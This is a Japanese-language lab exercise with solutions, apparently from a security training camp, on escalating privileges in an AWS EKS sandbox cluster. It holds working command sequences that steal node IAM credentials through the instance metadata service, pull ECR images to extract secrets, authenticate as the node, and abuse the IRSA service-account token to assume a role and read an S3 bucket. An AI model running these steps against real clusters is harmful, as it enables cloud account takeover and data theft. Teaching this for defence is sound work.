# EKS Privilege Escalation

## 必要なもの

- [kubectl](https://kubernetes.io/ja/docs/tasks/tools/install-kubectl/)
- [AWS CLI](https://docs.aws.amazon.com/ja_jp/cli/latest/userguide/getting-started-install.html)

共有した AWS クレデンシャルを設定しておいてください。

```shell
$ cat ~/.aws/credentials
[default]
aws_access_key_id = ASIA…
aws_secret_access_key = …
aws_region = ap-northeast-1
```

次のコマンドで EKS への接続設定をして、`kubectl get pods` が成功すれば OK です。

```shell
$ aws eks update-kubeconfig --name sandbox-seccamp --region ap-northeast-1
Added new context arn:aws:eks:ap-northeast-1:...:cluster/sandbox-seccamp to /root/.kube/config

$ kubectl get pods
No resources found in default namespace.
```

## この演習で必要なコマンドの使い方 Tips
<details><summary>📗 開く</summary>

### 侵害したと仮定した worker コンテナに入る

```shell
kubectl -n default exec -it worker bash
```

### IMDS へアクセスする

コンテナの中から次のコマンドを実行する

```shell
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
curl -w "\n" -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### IMDS から取得したクレデンシャルを使って AWS の API を実行する

```shell
$ export AWS_ACCESS_KEY_ID=ASIA... # AccessKeyId の値をセットする
$ export AWS_SECRET_ACCESS_KEY=... # SecretAccessKey の値をセットする
$ export AWS_SESSION_TOKEN=... # Token の値をセットする

# このコマンドが成功すれば認証成功
# ref. https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html
$ aws sts get-caller-identity
{
    "UserId": "...",
    "Account": "...",
    "Arn": "..."
}
```

### コンテナに設定されている環境変数を取得する

コンテナの中で次のコマンドを実行

```shell
env
```

### IRSA で ServiceAccount に紐づいたアクセストークンを取得する

```shell
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

### AssumeRoleWithWebIdentity API を呼び出す

```shell
aws sts assume-role-with-web-identity \
  --web-identity-token $(cat /var/run/secrets/eks.amaznaws.com/serviceaccount/token) \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name attacker
```

</details>

## 1. IMDS を利用して ECR リポジトリからイメージを取得

🎯 目的: 侵害したコンテナから Node にアタッチされた IAM Role の権限で ECR リポジトリからイメージを取得する
🚩 追加課題: イメージ内にある secrets.txt を取得しよう

<details><summary>解説</summary>

### 1. IMDS からクレデンシャルを取得する

```shell
# ここに書いているコマンドは worker コンテナの中で実行してします

$ TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
$ curl -w "\n" -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
security-credentials/eksctl-sandbox-seccamp-nodegroup-NodeInstanceRole-...

# 上記パスにアクセスしてクレデンシャルを取得
$ curl -w "\n" -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/security-credentials/eksctl-sandbox-seccamp-nodegroup-NodeInstanceRole-...

  "Code" : "Success",
  "LastUpdated" : "2023-08-06T09:53:06Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA...",
  "SecretAccessKey" : "htj...",
  "Token" : "IQo...",
  "Expiration" : "2023-08-06T16:28:13Z"
}
```

### 2. ECR の情報を取得

```shell
# 必要なクレデンシャルを手に入れたので、ここからは手元の端末から実行しています
$ export AWS_ACCESS_KEY_ID=ASIA...
$ export AWS_SECRET_ACCESS_KEY=htj...
$ export AWS_SESSION_TOKEN=IQo...
$ export AWS_REGION=ap-northeast-1

# Arn が eksctl-sandbox-seccamp-nodegroup-NodeInstanceRole-... になっていれば OK
$ aws sts get-caller-identity
{
    "UserId": "AROA...:i-0a67e16c913236a0e",
    "Account": "...",
    "Arn": "arn:aws:sts::...:assumed-role/eksctl-sandbox-seccamp-nodegroup-NodeInstanceRole-..."
}

$ aws ecr describe-repositories
{
    "repositories": [
        {
            "repositoryArn": "arn:aws:ecr:ap-northeast-1:761166754261:repository/seccamp",
            "registryId": "761166754261",
            "repositoryName": "seccamp",
            "repositoryUri": "761166754261.dkr.ecr.ap-northeast-1.amazonaws.com/seccamp",
            "createdAt": "2023-08-05T08:10:51+00:00",
            "imageTagMutability": "MUTABLE",
            "imageScanningConfiguration": {
                "scanOnPush": false
            },
            "encryptionConfiguration": {
                "encryptionType": "AES256"
            }
        }
    ]
}

$ aws ecr list-images --repository-name seccamp
{
    "imageIds": [
        {
            "imageDigest": "sha256:1327ab6e9394e6854f22f4101fd11402ca9c4cc53c50d6c9bed0ce3a0f4d69b6",
            "imageTag": "latest"
        }
    ]
}
```

### 3. ECR からイメージを取得


```shell
$ aws ecr get-login-password --region ap-northeast-1 | docker login --username AWS --password-stdin 761166754261.dkr.ecr.ap-northeast-1.amazonaws.com
Login Succeeded

Logging in with your password grants your terminal complete access to your account.
For better security, log in with a limited-privilege personal access token. Learn more at https://docs.docker.com/go/access-tokens/

$ docker pull 761166754261.dkr.ecr.ap-northeast-1.amazonaws.com/seccamp:latest
```

### 4. 追加課題: secrets.txt を取得する

```shell
$ mkdir tmp && cd tmp
$ docker save 761166754261.dkr.ecr.ap-northeast-1.amazonaws.com/seccamp:latest -o seccamp.tar.gz
$ find . | grep layer.tar
383fd6c5e54eb4819bebd4603fa6b34052405037469bfeda873d01740505be74/layer.tar
3c32de9ccf25116a28648226e2804220fbb8e24e2a4ddf23e2f79c982c2034e8/layer.tar
de8b86e33ae69ac28a5379fc79eccc42f37c41395732b90ae47075d4c2efcee1/layer.tar

$ cd 383fd6c5e54eb4819bebd4603fa6b34052405037469bfeda873d01740505be74/
$ tar xzf layer.tar
$ ls etc/
secrets.txt
```


</details>

## 2. Node として認証する

🎯 目的: 侵害したコンテナから Node にアタッチされた IAM Role の権限で Node として認証する
🚩 追加課題: どういった横展開ができるか調べよう

<details><summary>解説</summary>

### 1. IMDS からクレデンシャルを取得する

これは 1 と同じ

### 2. EKS アクセスの設定をする

```
# 手元のクレデンシャルをコリジョンしてしまうのを防ぎたいのでコンテナを使う
$ docker run --rm -it --entrypoint bash amazon/aws-cli
# コンテナの中で実行
$ export AWS_ACCESS_KEY_ID=ASIA...
$ export AWS_SECRET_ACCESS_KEY=htj...
$ export AWS_SESSION_TOKEN=IQo...
$ export AWS_REGION=ap-northeast-1

# kubectl をインストール
$ curl -LO "https://dl.k8s.io/release/$(curl -LS https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
$ chmod +x kubectl
$ mv ./kubectl /usr/local/bin

# クラスタ名は aws ec2 describe-instances の結果から、インスタンスのタグに入っている。割愛。
$ aws eks update-kubeconfig --name sandbox-seccamp
Added new context arn:aws:eks:ap-northeast-1:...:cluster/sandbox-seccamp to /root/.kube/config

$ kubectl get pods --all-namespaces
NAMESPACE     NAME                              READY   STATUS    RESTARTS   AGE
kube-system   aws-node-jql4z                    1/1     Running   0          47m
kube-system   coredns-8496bbc677-8jr6m          1/1     Running   0          54m
kube-system   coredns-8496bbc677-nx524          1/1     Running   0          54m
kube-system   kube-proxy-gmz2p                  1/1     Running   0          47m
kube-system   metrics-server-5d875656f5-d6rsn   1/1     Running   0          40m
...
```

</details>

## 3. IRSA を利用して S3 へアクセスしよう

🎯 目的: 侵害したコンテナから IRSA を利用して S3 にアクセスし、secrets.txt を取得しよう

<details><summary>解説</summary>

### 1. JWT を取得する

環境変数 `AWS_ROLE_ARN` の値と `AWS_WEB_IDENTITY_TOKEN_FILE` のファイルの値(JWT)をメモしておきます。

```shell
# このコマンドは worker コンテナ内で実行しています

$ env | grep AWS_
AWS_DEFAULT_REGION=ap-northeast-1
AWS_REGION=ap-northeast-1
AWS_ROLE_ARN=arn:aws:iam::...:role/eksctl-sandbox-seccamp-addon-iamserviceaccou-Role1-...
AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
AWS_STS_REGIONAL_ENDPOINTS=regional

$ cat $AWS_WEB_IDENTITY_TOKEN_FILE
eyJhbGciO...
```

### 2. `AssumeRoleWithWebIdentity` を呼び出してクレデンシャルを取得

```shell
# 必要なクレデンシャルを手に入れたので、ここからは手元の端末から実行しています
# まっさらな環境で実行できることを確認するためにコンテナを使います
$ docker run --rm -it --entrypoint bash amazon/aws-cli
$ export JWT=(1で取得したJWT)
$ export AWS_ROLE_ARN=(1で取得した AWS_ROLE_ARN の値)
$ aws sts assume-role-with-web-identity \
  --web-identity-token $JWT \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name attacker
{
    "Credentials": {
        "AccessKeyId": "ASIA...",
        "SecretAccessKey": "W+/sl7...",
        "SessionToken": "Fw..."
        ...
    }
}
```

### 3. 取得したクレデンシャルを使って S3 の情報を取得

```shell
$ export AWS_ACCESS_KEY_ID=ASIA... # AccessKeyId の値をセットする
$ export AWS_SECRET_ACCESS_KEY=... # SecretAccessKey の値をセットする
$ export AWS_SESSION_TOKEN=... # SessionToken の値をセットする
$ export AWS_REGION=ap-northeast-1

$ aws s3 ls
2023-08-06 09:26:19 seccamp-2023-hidden
$ aws s3 ls seccamp-2023-hidden
2023-08-06 09:27:27         38 hidden.txt
$ aws s3 cp s3://seccamp-2023-hidden/hidden.txt .
download: s3://seccamp-2023-hidden/hidden.txt to ./hidden.txt
$ ls
hidden.txt
```

</details>

